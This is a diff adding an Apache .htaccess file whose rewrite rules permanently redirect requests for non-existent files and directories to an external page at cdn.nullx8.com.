@@ -1,0 +1,6 @@
+RewriteEngine On
+# If the requested filename is NOT an existing file
+RewriteCond %{REQUEST_FILENAME} !-f
+# AND if the requested filename is NOT an existing directory
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule ^(.*)$ https://cdn.nullx8.com/nullx8.html [R=301]
